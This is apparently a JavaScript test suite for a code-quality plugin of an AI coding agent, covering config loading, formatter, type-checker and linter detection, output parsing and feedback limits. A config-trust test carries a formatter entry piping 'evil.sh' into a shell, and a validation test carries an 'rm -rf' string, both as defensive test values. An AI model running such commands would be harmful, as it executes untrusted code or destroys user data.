const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');

const cfgMod = require('../config.js');
const { detectFormatter } = require('../formatters.js');
const tc = require('../typecheck.js');
const { formatFile } = require('../format.js');
const { runChecks } = require('../check.js');
const { resolveToolPath } = require('../run.js');

// Fake file system: files = { absPath: content }, path = list of PATH binaries.
function fakeEnv(files, bins = []) {
  return {
    exists: (p) => p in files,
    read: (p) => files[p],
    which: (b) => (bins.includes(b) ? '/usr/bin/' + b : undefined),
  };
}
const cfg = (over = {}) => ({ format: true, typecheck: true, lint: true, formatters: {}, disable: [], ...over });

test('config: user config parsed, project config may only disable', () => {
  const files = {
    '/h/.pi/agent/quality.json': JSON.stringify({ formatters: { ts: ['my-fmt', '--w'] }, disable: ['Ruff'] }),
    '/p/.pi/quality.json': JSON.stringify({ format: true, typecheck: false, formatters: { py: ['curl', 'evil.sh|sh'] }, disable: ['prettier'] }),
  };
  const c = cfgMod.loadConfig({ home: '/h', cwd: '/p', readFile: (f) => { if (f in files) return files[f]; throw new Error('ENOENT'); } });
  assert.equal(c.format, true);
  assert.equal(c.typecheck, false);
  assert.deepEqual(c.formatters, { '.ts': ['my-fmt', '--w'] }); // project formatters ignored
  assert.deepEqual(c.disable.sort(), ['prettier', 'ruff']);
});

test('config: project cannot re-enable what user disabled; bad JSON ignored', () => {
  const files = { '/h/.pi/agent/quality.json': '{"format":false}', '/p/.pi/quality.json': '{"format":true}' };
  const rf = (f) => { if (f in files) return files[f]; throw new Error('x'); };
  assert.equal(cfgMod.loadConfig({ home: '/h', cwd: '/p', readFile: rf }).format, false);
  const bad = cfgMod.loadConfig({ home: '/h', cwd: '/q', readFile: () => '{nope' });
  assert.deepEqual(bad, { format: true, typecheck: true, lint: true, formatters: {}, disable: [] });
  assert.deepEqual(cfgMod.parseUser({ formatters: { ts: 'rm -rf', js: [], css: [1] } }).formatters, {});
});

test('formatter: prettier local bin, prettier global needs config, none otherwise', () => {
  const local = fakeEnv({ '/p/node_modules/.bin/prettier': '', '/p/src/a.ts': '' });
  const f = detectFormatter('/p/src/a.ts', cfg(), local);
  assert.equal(f.name, 'prettier');
  assert.equal(f.bin, '/p/node_modules/.bin/prettier');
  assert.equal(f.cwd, '/p');
  assert.deepEqual(f.args.slice(-1), ['/p/src/a.ts']);

  const noCfg = fakeEnv({}, ['prettier']);
  assert.equal(detectFormatter('/p/a.ts', cfg(), noCfg), undefined);
  const withCfg = fakeEnv({ '/p/.prettierrc': '{}' }, ['prettier']);
  assert.equal(detectFormatter('/p/a.ts', cfg(), withCfg).bin, '/usr/bin/prettier');
  assert.equal(detectFormatter('/p/a.rb', cfg(), local), undefined);
  assert.equal(detectFormatter('/p/src/a.ts', cfg({ disable: ['prettier'] }), local), undefined);
  assert.equal(detectFormatter('/p/src/a.ts', cfg({ format: false }), local), undefined);
});

test('formatter: biome preferred when biome.json + local binary', () => {
  const env = fakeEnv({ '/p/biome.json': '', '/p/node_modules/.bin/biome': '', '/p/node_modules/.bin/prettier': '' });
  const f = detectFormatter('/p/x.ts', cfg(), env);
  assert.equal(f.name, 'biome');
  assert.deepEqual(f.args, ['format', '--write', '/p/x.ts']);
  const noBin = fakeEnv({ '/p/biome.json': '', '/p/node_modules/.bin/prettier': '' });
  assert.equal(detectFormatter('/p/x.ts', cfg(), noBin).name, 'prettier');
});

test('formatter: python needs project config; go/rust/shell need binary', () => {
  assert.equal(detectFormatter('/p/a.py', cfg(), fakeEnv({}, ['ruff'])), undefined);
  const ruff = fakeEnv({ '/p/pyproject.toml': '[tool.ruff]\nline-length=100' }, ['ruff']);
  assert.equal(detectFormatter('/p/a.py', cfg(), ruff).name, 'ruff');
  const black = fakeEnv({ '/p/pyproject.toml': '[tool.black]' }, ['black']);
  assert.equal(detectFormatter('/p/a.py', cfg(), black).name, 'black');
  const venv = fakeEnv({ '/p/ruff.toml': '', '/p/.venv/bin/ruff': '' });
  assert.equal(detectFormatter('/p/pkg/a.py', cfg(), venv).bin, '/p/.venv/bin/ruff');

  assert.equal(detectFormatter('/p/main.go', cfg(), fakeEnv({}, ['gofmt'])).name, 'gofmt');
  assert.equal(detectFormatter('/p/main.go', cfg(), fakeEnv({})), undefined);
  const rs = detectFormatter('/p/src/lib.rs', cfg(), fakeEnv({ '/p/Cargo.toml': '[package]\nedition = "2021"' }, ['rustfmt']));
  assert.deepEqual(rs.args, ['--edition', '2021', '/p/src/lib.rs']);
  assert.equal(rs.cwd, '/p');
  assert.equal(detectFormatter('/p/a.sh', cfg(), fakeEnv({}, ['shfmt'])).name, 'shfmt');
});

test('formatter: user override replaces detection, {file} substitution', () => {
  const c = cfg({ formatters: { '.ts': ['dprint', 'fmt', '--stdin={file}'], '.lua': ['stylua'] } });
  const f = detectFormatter('/p/a.ts', c, fakeEnv({}));
  assert.deepEqual([f.bin, f.args], ['dprint', ['fmt', '--stdin=/p/a.ts']]);
  assert.deepEqual(detectFormatter('/p/a.lua', c, fakeEnv({})).args, ['/p/a.lua']);
  assert.equal(detectFormatter('/p/a.ts', cfg({ ...c, disable: ['dprint'] }), fakeEnv({})), undefined);
});

test('formatFile: reports change, tolerates failure/missing', async () => {
  const env = fakeEnv({ '/p/node_modules/.bin/prettier': '' });
  let content = 'a  =  1';
  const base = { env, cwd: '/p', readFile: () => content };
  const changed = await formatFile('/p/a.ts', cfg(), { ...base, run: async () => { content = 'a = 1;'; return { ok: true }; } });
  assert.equal(changed.changed, true);
  assert.match(changed.note, /prettier reformatted a\.ts/);
  const same = await formatFile('/p/a.ts', cfg(), { ...base, run: async () => ({ ok: true }) });
  assert.equal(same.changed, false);
  const fail = await formatFile('/p/a.ts', cfg(), { ...base, run: async () => ({ ok: false, code: 2 }) });
  assert.deepEqual([fail.changed, fail.failed], [false, 'exit 2']);
  const thrown = await formatFile('/p/a.ts', cfg(), { ...base, run: async () => { throw new Error('x'); } });
  assert.equal(thrown.changed, false);
});

test('planCheck: tsc needs tsconfig + local tsc; python needs configured checker', () => {
  const env = fakeEnv({ '/p/tsconfig.json': '{}', '/p/node_modules/.bin/tsc': '' });
  const plan = tc.planCheck('/p/src/a.ts', cfg(), env);
  assert.equal(plan.name, 'tsc');
  assert.deepEqual(plan.args, ['--noEmit', '--pretty', 'false', '-p', '/p/tsconfig.json']);
  assert.equal(plan.cwd, '/p');
  assert.equal(tc.planCheck('/p/src/a.ts', cfg(), fakeEnv({ '/p/tsconfig.json': '{}' }, ['tsc'])), undefined);
  assert.equal(tc.planCheck('/p/src/a.ts', cfg({ typecheck: false }), env), undefined);
  assert.equal(tc.planCheck('/p/src/a.ts', cfg({ disable: ['tsc'] }), env), undefined);
  assert.equal(tc.planCheck('/p/a.js', cfg(), env), undefined);

  assert.equal(tc.planCheck('/p/a.py', cfg(), fakeEnv({}, ['pyright', 'mypy'])), undefined);
  assert.equal(tc.planCheck('/p/a.py', cfg(), fakeEnv({ '/p/pyrightconfig.json': '' }, ['pyright'])).name, 'pyright');
  const my = tc.planCheck('/p/a.py', cfg(), fakeEnv({ '/p/pyproject.toml': '[tool.mypy]' }, ['mypy']));
  assert.equal(my.name, 'mypy');
  assert.equal(my.appendFiles, true);
});

test('batch groups files per project and resets on take (debounce to one run)', () => {
  const b = new tc.Batch();
  const p1 = { key: 'tsc:/p', name: 'tsc' };
  const p2 = { key: 'tsc:/q', name: 'tsc' };
  b.add(p1, '/p/a.ts'); b.add(p1, '/p/b.ts'); b.add(p1, '/p/a.ts'); b.add(p2, '/q/c.ts');
  assert.equal(b.size, 2);
  const groups = b.take();
  assert.deepEqual(groups.find((g) => g.plan === p1).files, ['/p/a.ts', '/p/b.ts']);
  assert.equal(b.size, 0);
  assert.deepEqual(b.take(), []);
});

test('parsers', () => {
  const tsc = 'src/a.ts(3,5): error TS2322: Type \'string\' is not assignable to type \'number\'.\n  Detail line\nsrc/b.ts(1,1): error TS1005: x';
  const e = tc.parseTsc(tsc, '/p');
  assert.equal(e.length, 2);
  assert.equal(e[0].file, '/p/src/a.ts');
  assert.match(e[0].text, /TS2322.*Detail line/);
  assert.deepEqual(tc.parseMypy('a.py:4: error: Bad type  [assignment]\na.py:4: note: hint', '/p').map((x) => [x.file, x.line]), [['/p/a.py', 4]]);
  assert.equal(tc.parsePyright('  /p/a.py:12:5 - error: "x" is not defined (reportUndefinedVariable)\n  /p/a.py:13:1 - warning: meh', '/p').length, 1);
});

test('selectErrors keeps only touched files; buildFeedback caps at 30 lines', () => {
  const errs = Array.from({ length: 40 }, (_, i) => ({ file: '/p/a.ts', line: i + 1, text: 'TS1: bad' }));
  errs.push({ file: '/p/other.ts', line: 1, text: 'TS2: old' });
  const { mine, others } = tc.selectErrors(errs, ['/p/a.ts']);
  assert.equal(mine.length, 40);
  assert.equal(others, 1);
  const msg = tc.buildFeedback({ name: 'tsc', cwd: '/p', errors: mine, others });
  const lines = msg.split('\n');
  assert.match(lines[0], /tsc found 40 errors in files you edited/);
  assert.equal(lines.filter((l) => l.startsWith('a.ts:')).length, 30);
  assert.ok(lines.includes('... and 10 more'));
  assert.match(lines[lines.length - 1], /1 other pre-existing error/);
});

test('FeedbackGuard: max rounds, no identical resend, reset, passed()', () => {
  const g = new tc.FeedbackGuard(3);
  assert.equal(g.allow('a'), true);
  assert.equal(g.allow('a'), false);
  assert.equal(g.allow('b'), true);
  g.passed();
  assert.equal(g.allow('b'), true);
  assert.equal(g.allow('c'), false); // 3 rounds used
  g.reset();
  assert.equal(g.allow('c'), true);
});

test('runChecks: reports touched-file errors, warns on timeout/unparseable, ignores missing', async () => {
  const plan = { name: 'tsc', bin: '/p/tsc', args: ['x'], cwd: '/p', key: 'k' };
  const out = 'a.ts(1,1): error TS1: bad\nz.ts(1,1): error TS2: old';
  const r = await runChecks([{ plan, files: ['/p/a.ts'] }], { run: async () => ({ ok: false, code: 2, stdout: out, stderr: '' }) });
  assert.equal(r.problems.length, 1);
  assert.equal(r.problems[0].others, 1);
  assert.match(r.problems[0].message, /a\.ts:1 TS1: bad/);

  const clean = await runChecks([{ plan, files: ['/p/z.ts'] }], { run: async () => ({ ok: false, code: 2, stdout: 'a.ts(1,1): error TS1: bad', stderr: '' }) });
  assert.equal(clean.problems.length, 0);
  const to = await runChecks([{ plan, files: ['/p/a.ts'] }], { run: async () => ({ ok: false, timedOut: true }) });
  assert.match(to.warnings[0], /timed out/);
  const junk = await runChecks([{ plan, files: ['/p/a.ts'] }], { run: async () => ({ ok: false, code: 1, stdout: 'boom', stderr: '' }) });
  assert.match(junk.warnings[0], /unparseable/);
  const miss = await runChecks([{ plan, files: ['/p/a.ts'] }], { run: async () => ({ ok: false, missing: true }) });
  assert.deepEqual([miss.problems.length, miss.warnings.length], [0, 0]);
  const mypy = { name: 'mypy', bin: 'mypy', args: ['--x'], cwd: '/p', key: 'm', appendFiles: true };
  let got;
  await runChecks([{ plan: mypy, files: ['/p/a.py'] }], { run: async (b, a) => { got = a; return { ok: true }; } });
  assert.deepEqual(got, ['--x', '/p/a.py']);
});

test('resolveToolPath mirrors Pi (@ prefix, ~, relative)', () => {
  assert.equal(resolveToolPath('@src/a.ts', '/p', '/h'), path.resolve('/p/src/a.ts'));
  assert.equal(resolveToolPath('~/x.ts', '/p', '/h'), path.resolve('/h/x.ts'));
  assert.equal(resolveToolPath('/abs/a.ts', '/p', '/h'), '/abs/a.ts');
});

const lint = require('../lint.js');

test('config: lint flag; user may disable, project may only disable', () => {
  const rf = (files) => (f) => { if (f in files) return files[f]; throw new Error('x'); };
  assert.equal(cfgMod.loadConfig({ home: '/h', cwd: '/p', readFile: rf({}) }).lint, true);
  assert.equal(cfgMod.loadConfig({ home: '/h', cwd: '/p', readFile: rf({ '/h/.pi/agent/quality.json': '{"lint":false}' }) }).lint, false);
  assert.equal(cfgMod.loadConfig({ home: '/h', cwd: '/p', readFile: rf({ '/p/.pi/quality.json': '{"lint":false}' }) }).lint, false);
  // project `true` cannot re-enable what the user turned off
  assert.equal(cfgMod.loadConfig({ home: '/h', cwd: '/p', readFile: rf({ '/h/.pi/agent/quality.json': '{"lint":false}', '/p/.pi/quality.json': '{"lint":true}' }) }).lint, false);
});

test('planLint: eslint needs config + local binary', () => {
  const bin = '/p/node_modules/.bin/eslint';
  const names = (f, files, bins, over) => lint.planLint(f, cfg(over), fakeEnv(files, bins)).map((p) => p.name);
  assert.deepEqual(names('/p/src/a.ts', { '/p/eslint.config.js': '', [bin]: '' }), ['eslint']);
  assert.deepEqual(names('/p/src/a.ts', { '/p/package.json': '{"eslintConfig":{}}', [bin]: '' }), ['eslint']);
  assert.deepEqual(names('/p/src/a.ts', { '/p/eslint.config.js': '' }, ['eslint']), [], 'global eslint is never used');
  assert.deepEqual(names('/p/src/a.ts', { [bin]: '' }), [], 'no config');
  assert.deepEqual(names('/p/src/a.ts', { '/p/eslint.config.js': '', [bin]: '' }, [], { disable: ['eslint'] }), []);
  assert.deepEqual(names('/p/src/a.ts', { '/p/eslint.config.js': '', [bin]: '' }, [], { lint: false }), []);
  const [plan] = lint.planLint('/p/a.js', cfg(), fakeEnv({ '/p/eslint.config.js': '', [bin]: '' }));
  assert.deepEqual([plan.bin, plan.cwd, plan.appendFiles], [bin, '/p', true]);
});

test('planLint: ruff, go vet, cargo check', () => {
  const names = (f, files, bins, over) => lint.planLint(f, cfg(over), fakeEnv(files, bins)).map((p) => p.name);
  assert.deepEqual(names('/p/a.py', { '/p/pyproject.toml': '[tool.ruff.lint]\n' }, ['ruff']), ['ruff-check']);
  assert.deepEqual(names('/p/a.py', { '/p/ruff.toml': '', '/p/.venv/bin/ruff': '' }), ['ruff-check']);
  assert.deepEqual(names('/p/a.py', { '/p/pyproject.toml': '[tool.ruff]' }), [], 'ruff unavailable');
  assert.deepEqual(names('/p/a.py', { '/p/pyproject.toml': '[tool.black]' }, ['ruff']), [], 'no ruff config');
  assert.deepEqual(names('/p/a.py', { '/p/ruff.toml': '' }, ['ruff'], { disable: ['ruff-check'] }), []);
  assert.deepEqual(names('/p/x/a.go', { '/p/go.mod': '' }, ['go']), ['go-vet']);
  assert.deepEqual(names('/p/x/a.go', { '/p/go.mod': '' }), []);
  assert.deepEqual(names('/p/x/a.go', {}, ['go']), []);
  const [cargo] = lint.planLint('/p/src/a.rs', cfg(), fakeEnv({ '/p/Cargo.toml': '' }, ['cargo']));
  assert.deepEqual([cargo.name, cargo.cwd, cargo.timeoutMs], ['cargo-check', '/p', lint.CARGO_TIMEOUT_MS]);
  assert.deepEqual(names('/p/src/a.rs', { '/p/Cargo.toml': '' }, ['cargo'], { disable: ['cargo-check'] }), []);
  assert.deepEqual(names('/p/src/a.toml', { '/p/Cargo.toml': '' }, ['cargo']), [], 'only touched .rs files');
});

test('lint parsers', () => {
  const es = JSON.stringify([
    { filePath: '/p/a.js', messages: [{ severity: 2, line: 3, ruleId: 'no-undef', message: "'x' is not defined." }, { severity: 1, line: 4, ruleId: 'semi', message: 'warn' }] },
    { filePath: '/p/b.js', messages: [{ severity: 2, line: 1, ruleId: null, message: 'Parsing error' }] },
  ]);
  assert.deepEqual(tc.parseOutput('eslint', 'noise\n' + es + '\n', '/p'), [
    { file: '/p/a.js', line: 3, text: "no-undef: 'x' is not defined." },
    { file: '/p/b.js', line: 1, text: 'Parsing error' },
  ]);
  assert.deepEqual(tc.parseOutput('eslint', '[not json', '/p'), []);
  assert.deepEqual(tc.parseOutput('ruff-check', "a.py:2:8: F401 [*] `os` imported but unused\nFound 1 error.\n", '/p'), [{ file: '/p/a.py', line: 2, text: 'F401 [*] `os` imported but unused' }]);
  assert.deepEqual(tc.parseOutput('go-vet', '# pkg\n./a.go:5:2: unreachable code\nvet: b.go:1:1: bad\n', '/p'), [
    { file: '/p/a.go', line: 5, text: 'unreachable code' },
    { file: '/p/b.go', line: 1, text: 'bad' },
  ]);
  assert.deepEqual(tc.parseOutput('cargo-check', 'src/a.rs:3:5: error[E0425]: cannot find value `x`\nsrc/a.rs:4:1: warning: unused\nerror: could not compile\n', '/p'), [{ file: '/p/src/a.rs', line: 3, text: 'E0425: cannot find value `x`' }]);
});

test('runChecks: lint plan filters to touched files, honours plan timeout, shares signature', async () => {
  const plan = { name: 'ruff-check', bin: 'ruff', args: ['check'], cwd: '/p', key: 'r', appendFiles: true, timeoutMs: 5000 };
  let opts;
  const out = 'a.py:1:1: F401 unused\nold.py:1:1: E501 long\n';
  const r = await runChecks([{ plan, files: ['/p/a.py'] }], { run: async (b, a, o) => { opts = o; return { ok: false, code: 1, stdout: out, stderr: '' }; } });
  assert.equal(opts.timeoutMs, 5000);
  assert.equal(r.problems[0].errors.length, 1);
  assert.equal(r.problems[0].others, 1);
  assert.match(r.problems[0].message, /ruff-check found 1 error/);
  assert.match(r.signature, /a\.py:1:F401 unused/);
  const to = await runChecks([{ plan, files: ['/p/a.py'] }], { run: async () => ({ ok: false, timedOut: true }) });
  assert.match(to.warnings[0], /timed out after 5s/);
});
